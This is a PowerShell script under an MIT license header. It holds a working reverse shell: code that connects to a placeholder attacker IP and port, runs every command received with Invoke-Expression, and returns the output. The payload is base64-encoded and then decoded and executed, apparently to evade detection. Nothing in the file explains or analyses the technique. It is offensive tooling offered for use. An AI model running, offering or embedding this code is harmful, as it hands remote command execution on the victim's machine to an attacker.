########################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################################

$code = @"
\$ip = 'your_ip'
\$port = your_port
\$e = [System.Text.Encoding]::ASCII
\$w = New-Object Net.Sockets.TCPClient(\$ip, \$port)
\$s = \$w.GetStream()
\$b = New-Object Byte[] 1024
while ((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0) {
    \$d = (\$e.GetString(\$b, 0, \$i) -replace "`n","")
    \$r = Invoke-Expression \$d 2>&1 | Out-String
    \$r2 = \$r + "PS " + (pwd).Path + "> "
    \$sb = \$e.GetBytes(\$r2)
    \$s.Write(\$sb, 0, \$sb.Length)
    \$s.Flush()
}
"@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
$encoded = [Convert]::ToBase64String($bytes)
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
Invoke-Expression $decoded
